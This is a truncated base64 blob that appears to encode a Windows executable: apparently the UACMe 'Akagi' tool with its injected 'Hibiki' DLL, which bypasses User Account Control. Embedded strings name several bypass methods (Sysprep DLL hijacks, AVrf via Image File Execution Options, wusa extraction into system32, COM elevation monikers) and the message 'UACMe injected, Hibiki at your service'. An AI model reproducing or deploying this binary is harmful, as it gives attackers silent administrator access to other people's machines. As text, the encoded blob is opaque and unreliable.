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AcwB1AGIAawBlAHkAAAAAAEcAbABvAGIAYQBsAEYAbABhAGcAAAAAAFsAVQBDAE0AXQAgAEYAYQBpAGwAZQBkACAAdABvACAAcwBlAHQAIABzAHUAYgBrAGUAeQAgAHYAYQBsAHUAZQAgADEAAAAAAEgAaQBiAGkAawBpAC4AZABsAGwAAAAAAFYAZQByAGkAZgBpAGUAcgBEAGwAbABzAAAAAAAAAAAAWwBVAEMATQBdACAARgBhAGkAbABlAGQAIAB0AG8AIABzAGUAdAAgAHMAdQBiAGsAZQB5ACAAdgBhAGwAdQBlACAAMgAAAAAAJQB0AGUAbQBwACUAXABIAGkAYgBpAGsAaQAuAGQAbABsAAAAWwBVAEMATQBdACAAVwB1AHMAYQAgAGYAYQBpAGwAZQBkACAAYwBvAHAAeQAgAEgAaQBiAGkAawBpAAAAJQBzAHkAcwB0AGUAbQByAG8AbwB0ACUAXABzAHkAcwB0AGUAbQAzADIAXAB3AGkAbgBzAGEAdAAuAGUAeABlAAAAAAAlAHQAZQBtAHAAJQBcAHcAaQBuAHMAYQB0AC4AZQB4AGUAAAAlAHQAZQBtAHAAJQBcAAAAWwBVAEMATQBdACAARABsAGwAIABkAHIAbwBwAHAAZQBkACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAAAAAAHcAaQBuAHMAYQB0AC4AZQB4AGUAAAAAAC8AYwAgAHcAdQBzAGEAIAAlAHcAcwAgAC8AZQB4AHQAcgBhAGMAdAA6ACUAJQB3AGkAbgBkAGkAcgAlACUAXABzAHkAcwB0AGUAbQAzADIAXABzAHkAcwBwAHIAZQBwAAAAAAAAAAAAJQBzAHkAcwB0AGUAbQByAG8AbwB0ACUAXABzAHkAcwB0AGUAbQAzADIAXABzAHkAcwBwAHIAZQBwAFwAdwBpAG4AcwBhAHQALgBlAHgAZQAAAAAAJQBzAHkAcwB0AGUAbQByAG8AbwB0ACUAXABzAHkAcwB0AGUAbQAzADIAXABzAHkAcwBwAHIAZQBwAFwAAAAAACUAcwB5AHMAdABlAG0AcgBvAG8AdAAlAFwAcwB5AHMAdABlAG0AMwAyAFwAAAAAAGUAdgBlAG4AdAB2AHcAcgAuAG0AcwBjAAAAAABtAG0AYwAuAGUAeABlAAAAZQB4AHAAbABvAHIAZQByAC4AZQB4AGUAAAAAAAAAAABbAFUAQwBNAF0AIABDAGEAbgBuAG8AdAAgAG8AcABlAG4AIAB0AGEAcgBnAGUAdAAgAHAAcgBvAGMAZQBzAHMALgAAAAAAAABbAFUAQwBNAF0AIABDAGEAbgBuAG8AdAAgAGEAbABsAG8AYwBhAHQAZQAgAG0AZQBtAG8AcgB5ACAAaQBuACAAdABhAHIAZwBlAHQAIABwAHIAbwBjAGUAcwBzAC4AAABbAFUAQwBNAF0AIABDAGEAbgBuAG8AdAAgAHcAcgBpAHQAZQAgAHQAbwAgAHQAaABlACAAdABhAHIAZwBlAHQAIABwAHIAbwBjAGUAcwBzACAAbQBlAG0AbwByAHkALgAAAAAAVQBBAEMATQBlAAAAVABoAGkAcwAgAFcAaQBuAGQAbwB3AHMAIABpAHMAIAB1AG4AcwB1AHAAcABvAHIAdABlAGQALgAAAAAAAAAAAEEAZABtAGkAbgAgAGEAYwBjAG8AdQBuAHQAIAB3AGkAdABoACAAbABpAG0AaQB0AGUAZAAgAHQAbwBrAGUAbgAgAHIAZQBxAHUAaQByAGUAZAAuAAAAAABbAFUAQwBNAF0AIABTAHkAcwBwAHIAZQBwACAAYwByAHkAcAB0AGIAYQBzAGUACgANAAAAAAAAAFQAaABpAHMAIABtAGUAdABoAG8AZAAgAGkAcwAgAG8AbgBsAHkAIABmAG8AcgAgAHAAcgBlACAAVwBpAG4AZABvAHcAcwAgADgALgAxACAAdQBzAGUAAABbAFUAQwBNAF0AIABTAHkAcwBwAHIAZQBwACAAcwBoAGMAbwByAGUACgANAAAAAABUAGgAaQBzACAAbQBlAHQAaABvAGQAIABpAHMAIABvAG4AbAB5ACAAZgBvAHIAIABXAGkAbgBkAG8AdwBzACAAOAAuADEAIAB1AHMAZQAAAFsAVQBDAE0AXQAgAFMAeQBzAHAAcgBlAHAAIABkAGIAZwBjAG8AcgBlAAoADQAAAFQAaABpAHMAIABtAGUAdABoAG8AZAAgAGkAcwAgAG8AbgBsAHkAIABmAG8AcgAgAFcAaQBuAGQAbwB3AHMAIAAxADAAIAB1AHMAZQAAAAAAWwBVAEMATQBdACAATwBvAGIAZQAKAA0AAAAAAFsAVQBDAE0AXQAgAEEAcABwAEMAbwBtAHAAYQB0ACAAUgBlAGQAaQByAGUAYwB0AEUAWABFAAoADQAAAFQAaABpAHMAIABtAGUAdABoAG8AZAAgAGQAbwBlAHMAIABuAG8AdAAgAHcAbwByAGsAIABpAG4AIABXAGkAbgBkAG8AdwBzACAAMQAwACAAYgB1AGkAbABkAHMAIABnAHIAZQBhAHQAZQByACAAdABoAGEAbgAgADEAMAAxADMANgAAAFsAVQBDAE0AXQAgAFMAaQBtAGQAYQAKAA0AAABbAFUAQwBNAF0AIABDAGEAcgBiAGUAcgBwAAoADQAAAFsAVQBDAE0AXQAgAEMAYQByAGIAZQByAHAAXwBlAHgACgANAAAAAABbAFUAQwBNAF0AIABUAGkAbABvAG4ACgANAAAAWwBVAEMATQBdACAAQQBWAHIAZgAKAA0AAAAAAFsAVQBDAE0AXQAgAFcAaQBuAFMAQQBUAAoADQAAAAAAWwBVAEMATQBdACAAQQBwAHAAQwBvAG0AcABhAHQAIABTAGgAaQBtACAAUABhAHQAYwBoAAoADQAAAAAAWwBVAEMATQBdACAATQBNAEMAIAAKAA0AAAAAAEEAcABwAGEAcgBlAG4AdABsAHkAIABpAHQAIABzAGUAZQBtAHMAIAB5AG8AdQAgAGEAcgBlACAAcgB1AG4AbgBpAG4AZwAgAHUAbgBkAGUAcgAgAFcATwBXADYANAAuAAoADQBUAGgAaQBzACAAaQBzACAAbgBvAHQAIABzAHUAcABwAG8AcgB0AGUAZAAsACAAcgB1AG4AIAB4ADYANAAgAHYAZQByAHMAaQBvAG4AIABvAGYAIAB0AGgAaQBzACAAdABvAG8AbAAuAAAAAABbAFUAQwBNAF0AIABTAHQAYQBuAGQAYQByAGQAIABBAHUAdABvAEUAbABlAHYAYQB0AGkAbwBuACAAbQBlAHQAaABvAGQAIABjAGEAbABsAGUAZAAKAA0AAAAAAAAAAABbAFUAQwBNAF0AIABBAHAAcABDAG8AbQBwAGEAdAAgAG0AZQB0AGgAbwBkACAAYwBhAGwAbABlAGQACgANAAAAVABoAGkAcwAgAG0AZQB0AGgAbwBkACAAdwBpAGwAbAAgAFQAVQBSAE4AIABVAEEAQwAgAE8ARgBGACwAIABhAHIAZQAgAHkAbwB1ACAAcwB1AHIAZQA/ACAAWQBvAHUAIAB3AGkAbABsACAAbgBlAGUAZAAgAHQAbwAgAHIAZQBlAG4AYQBiAGwAZQAgAGkAdAAgAGEAZgB0AGUAcgAgAG0AYQBuAHUAYQBsAGwAeQAuAAAAAAAAAFQAaABpAHMAIABtAGUAdABoAG8AZAAgAGkAcwAgAG8AbgBsAHkAIABmAG8AcgAgAFcAaQBuAGQAbwB3AHMAIAA3AC8AOAAvADgALgAxAAAAWwBVAEMATQBdACAAQwBhAHIAYgBlAHIAcAAgAG0AZQB0AGgAbwBkACAAYwBhAGwAbABlAGQACgANAAAAWwBVAEMATQBdACAAQQBWAHIAZgAgAG0AZQB0AGgAbwBkACAAYwBhAGwAbABlAGQACgANAAAAAAAAAAAAVQBzAGUAIAAzADIAIABiAGkAdAAgAHYAZQByAHMAaQBvAG4AIABvAGYAIAB0AGgAaQBzACAAdABvAG8AbAAgAG8AbgAgADMAMgAgAGIAaQB0ACAATwBTACAAdgBlAHIAcwBpAG8AbgAAAAAAcABvAHcAcgBwAHIAbwBmAC4AZABsAGwAAAAAAGQAZQB2AG8AYgBqAC4AZABsAGwAAAAAAFsAVQBDAE0AXQAgAFcAaQBuAFMAQQBUACAAbQBlAHQAaABvAGQAIABjAGEAbABsAGUAZAAKAA0AAAAAAGUAbABzAGUAeAB0AC4AZABsAGwAAAAAAFsAVQBDAE0AXQAgAE0ATQBDACAAbQBlAHQAaABvAGQAIABjAGEAbABsAGUAZAAKAA0AAABlbWNhdQAAAGsAZQByAG4AZQBsADMAMgAuAGQAbABsAAAAAABvAGwAZQAzADIALgBkAGwAbAAAAHMAaABlAGwAbAAzADIALgBkAGwAbAAAAEUAbABlAHYAYQB0AGkAbwBuADoAQQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgAhAG4AZQB3ADoAewAzAGEAZAAwADUANQA3ADUALQA4ADgANQA3AC0ANAA4ADUAMAAtADkAMgA3ADcALQAxADEAYgA4ADUAYgBkAGIAOABlADAAOQB9AAAAAABDb0luaXRpYWxpemUAAAAAQ29DcmVhdGVJbnN0YW5jZQAAAABDb0dldE9iamVjdABDb1VuaW5pdGlhbGl6ZQAAU0hDcmVhdGVJdGVtRnJvbVBhcnNpbmdOYW1lAFNoZWxsRXhlY3V0ZUV4VwBXYWl0Rm9yU2luZ2xlT2JqZWN0AENsb3NlSGFuZGxlAE91dHB1dERlYnVnU3RyaW5nVwAAJQB0AGUAbQBwACUAXABDAFIAWQBQAFQAQgBBAFMARQAuAGQAbABsAAAAAAAAAAAAJQBzAHkAcwB0AGUAbQByAG8AbwB0ACUAXABzAHkAcwB0AGUAbQAzADIAXABzAHkAcwBwAHIAZQBwAFwAcwB5AHMAcAByAGUAcAAuAGUAeABlAAAAJQB0AGUAbQBwACUAXABzAGgAYwBvAHIAZQAuAGQAbABsAAAAJQB0AGUAbQBwACUAXABkAGIAZwBjAG8AcgBlAC4AZABsAGwAAAAAACUAcwB5AHMAdABlAG0AcgBvAG8AdAAlAFwAcwB5AHMAdABlAG0AMwAyAFwAbwBvAGIAZQBcAAAAJQBzAHkAcwB0AGUAbQByAG8AbwB0ACUAXABzAHkAcwB0AGUAbQAzADIAXABvAG8AYgBlAFwAcwBlAHQAdQBwAHMAcQBtAC4AZQB4AGUAAAAlAHQAZQBtAHAAJQBcAEEAYwB0AGkAbwBuAFEAdQBlAHUAZQAuAGQAbABsAAAAAABFAGwAZQB2AGEAdABpAG8AbgA6AEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAIQBuAGUAdwA6AHsANABEADEAMQAxAEUAMAA4AC0AQwBCAEYANwAtADQAZgAxADIALQBBADkAMgA2AC0AMgBDADcAOQAyADAAQQBGADUAMgBGAEMAfQAAAAAAewA0AEQAMQAxADEARQAwADgALQBDAEIARgA3AC0ANABmADEAMgAtAEEAOQAyADYALQAyAEMANwA5ADIAMABBAEYANQAyAEYAQwB9AAAAAAB7ADEANABCADIAQwA2ADEAOQAtAEQAMAA3AEEALQA0ADYARQBGAC0AOABCADYAMgAtADMAMQBCADYANABGADMAQgA4ADQANQBDAH0AAAAAAE0AQQBDAEgASQBOAEUAXABTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABwAG8AbABpAGMAaQBlAHMAXABzAHkAcwB0AGUAbQAAAFMAaABlAGwAbABfAFQAcgBhAHkAVwBuAGQAAABTAG8AZgB0AHcAYQByAGUAXABBAGsAYQBnAGkAAAAAAEwAbwB2AGUATABlAHQAdABlAHIAAAAAAAAAAAAAAAAAAAAAAIVm+lUAAAAADQAAANwAAAA4kAAAOH4AAAAAAACFZvpVAAAAAA4AAAAAAAAAAAAAAAAAAABHQ1RMABAAADgoAAAudGV4dCRtbgAAAAAAQAAAKAEAAC5pZGF0YSQ1AAAAADBBAAAITwAALnJkYXRhAAA4kAAA3AAAAC5yZGF0YSR6enpkYmcAAAAUkQAAjAAAAC5pZGF0YSQyAAAAAKCRAAAUAAAALmlkYXRhJDMAAAAAtJEAACgBAAAuaWRhdGEkNAAAAADckgAAwAQAAC5pZGF0YSQ2AAAAAACgAACAFQAALmJzcwAAAAAAwAAAoAAAAC5yc3JjJDAxAAAAAKDAAABABAAALnJzcmMkMDIAAAAA4JEAAAAAAAAAAAAA3JUAACxAAACYkgAAAAAAAAAAAABClgAA5EAAALSRAAAAAAAAAAAAAKCWAAAAQAAAkJIAAAAAAAAAAAAAwJYAANxAAADMkgAAAAAAAAAAAAD+lgAAGEEAALCSAAAAAAAAAAAAAIaXAAD8QAAAzJEAAAAAAAAAAAAAkJcAABhAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAG6WAABelgAATpYAAI6WAACAlgAAAAAAAA0AAIAKAACADgAAgAsAAIAAAAAAlpMAAKKTAAC4kwAAzJMAAOKTAADwkwAAApQAABaUAAAslAAAPpQAAFKUAABglAAAbJQAAHiUAACKlAAAqJQAAI6TAADIlAAA1pQAAOSUAAD+lAAAFJUAACiVAABAlQAAUpUAAGKVAABwlQAAfpUAAJSVAACmlQAAtJUAAMqVAAB8kwAAapMAAF6TAABOkwAAOJMAACiTAAAckwAADpMAAPiSAAC4lAAA3JIAAAAAAACulgAAAAAAACaWAADqlQAA9pUAAAqWAAAYlgAAAAAAABiXAAAIlwAASpcAAGSXAABulwAALpcAAAAAAADclgAAzJYAAOyWAAAAAAAAVQFFeHBhbmRFbnZpcm9ubWVudFN0cmluZ3NXAPoDT3V0cHV0RGVidWdTdHJpbmdXAAAKAURlbGV0ZUZpbGVXADMDSGVhcEZyZWUAAOMCR2V0VGVtcFBhdGhXAADNAkdldFN5c3RlbURpcmVjdG9yeVcAqANMb2FkTGlicmFyeVcAAC8DSGVhcEFsbG9jAJ0CR2V0UHJvY0FkZHJlc3MAAKICR2V0UHJvY2Vzc0hlYXAAAFIFU2x